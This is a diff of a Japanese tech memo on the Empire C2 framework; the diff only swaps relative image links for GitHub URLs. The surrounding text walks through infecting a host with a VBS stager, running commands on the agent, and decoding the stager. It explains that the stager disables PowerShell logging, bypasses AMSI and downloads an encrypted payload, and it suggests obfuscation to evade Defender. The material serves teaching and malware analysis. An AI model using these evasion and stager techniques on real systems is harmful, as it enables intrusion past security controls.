@@ -68,7 +68,7 @@ python -m SimpleHTTPServer 80
 
 まぁ、当たり前ですが、VBSファイルはWindowsDefenderで検知されて駆除されました。  
 
-|![Defenderでの検知](./images/empiredemo/detectedbydefender.png)|
+|![Defenderでの検知](https://github.com/proshiba/tech-memo/raw/main/hacking/images/empiredemo/detectedbydefender.png)|
 |:--:|
 
 このシンプルなVBSファイルは当たり前ですが、検出されます。基本的にmshtaやwscript.exeからpowershellのbase64コマンド実行は検出されるのが多いので、そのあたりの調整とコマンドラインの調整が必要だと思います。  
@@ -80,7 +80,7 @@ Note: 簡単な方法としてはInvoke-Obfuscationを使うことも有効で�
 
 そうすると、Empire側で以下のように接続が確認できます。これで感染は完了です。  
 
-|![Empireでの検知](./images/empiredemo/connection.png)|
+|![Empireでの検知](https://github.com/proshiba/tech-memo/raw/main/hacking/images/empiredemo/connection.png)|
 |----|
 
 このあとは、agentsで該当agentに対するinteractコマンドで操作モードに入れます。
@@ -98,7 +98,7 @@ shell start calc
 ```
 
 以下のように電卓が起動したら成功です。  
-|![電卓起動画面](./images/empiredemo/bootcalc.png)|
+|![電卓起動画面](https://github.com/proshiba/tech-memo/raw/main/hacking/images/empiredemo/bootcalc.png)|
 |:--:|
 
 さぁ、ここからはこのEmpireで使えることがなんなのかをみてみましょう。  
@@ -316,7 +316,7 @@ powershell -ep bypass -e ZQBjAGgAbwAgAHQAZQBzAHQA
 
 stagerコードを全部紐解いたものをそのまま張ると問題になるので、画像で貼ります。
 
-![empireのstageコードのデコード](./images/empiredemo/emire01.png)
+![empireのstageコードのデコード](https://github.com/proshiba/tech-memo/raw/main/hacking/images/empiredemo/emire01.png)
 
 さて、このコードについて内容を説明していきましょう。  
 ちなみに、こういう時私は基本的に;と中かっこ「{}」を探します。これらが一般にコードブロックの境目になるからです。また、まずはIEX(Invoke-Expression)を探すのも重要だと思います。  
@@ -331,12 +331,12 @@ IF($PSVeRSiOnTable.PSVersion.major -GE 3){...}
 1. powershellのロギング無効化
 ここでは、Powershellのロギングの無効化を行っています。
 
-![stagerの解説](./images/empiredemo/stager01.png)
+![stagerの解説](https://github.com/proshiba/tech-memo/raw/main/hacking/images/empiredemo/stager01.png)
 
 2. AMSIのバイパス
 このあと、AMSIのバイパスを行います。AMSIはWindows10以降で実装されたスクリプト系のマルウェアに対する非常に重要な機能です。これを使うことでアンチウィルスなどは起動中のシェルで実行されるコマンドを監視できます。
 
-![stagerの解説](./images/empiredemo/stager02.png)
+![stagerの解説](https://github.com/proshiba/tech-memo/raw/main/hacking/images/empiredemo/stager02.png)
 
 このAMSIのバイパスはスクリプト系マルウェアにとって最大の障壁と言えるかもしれません。  
 これが突破できると大体の操作は行える様になります。  
@@ -357,11 +357,11 @@ $data=$wc.downloaddata($ser+$t);
 ```
 
 この次は重要なコードになります。それは以下です。  
-![stagerの解説](./images/empiredemo/stager03.png)
+![stagerの解説](https://github.com/proshiba/tech-memo/raw/main/hacking/images/empiredemo/stager03.png)
 
 これは、この点だけだとわかりかねますが、スクリプトコードブロックを定義しており、ラムダ式の関数が定義されてます。呼び出し時は以下になってます。  
 
-![stagerの解説](./images/empiredemo/stager04.png)
+![stagerの解説](https://github.com/proshiba/tech-memo/raw/main/hacking/images/empiredemo/stager04.png)
 
 ザクっと言ってしまえば、暗号化されているデータの複合化、となります。  
 ivはイニシャルベクタでしょう。また、以下で定義しているのがカギ情報と思われます。  
@@ -374,15 +374,15 @@ $k=[system.text.encoding]::ascii.getbytes('u-pmif60(@gkke#8{d3z&+bds^5a![c2');
 
 デコードすると以下になります。  
 
-![stagerの解説](./images/empiredemo/stager05.png)
+![stagerの解説](https://github.com/proshiba/tech-memo/raw/main/hacking/images/empiredemo/stager05.png)
 
 色々気になるコードはあると思いますが、注目する点として以下のfunctionが呼ばれてます。  
 
-![stagerの解説](./images/empiredemo/stager06.png)
+![stagerの解説](https://github.com/proshiba/tech-memo/raw/main/hacking/images/empiredemo/stager06.png)
 
 この関数名について検索すると以下が出てきます。  
 
-![stagerの解説](./images/empiredemo/stager07.png)
+![stagerの解説](https://github.com/proshiba/tech-memo/raw/main/hacking/images/empiredemo/stager07.png)
 
 このソースコードは結局はこれを実行するためのダウンローダであった、ということになります。  
 スクリプトマルウェアの解析に関するいい教材になると思いましたので、ご説明をさせて頂きました。  
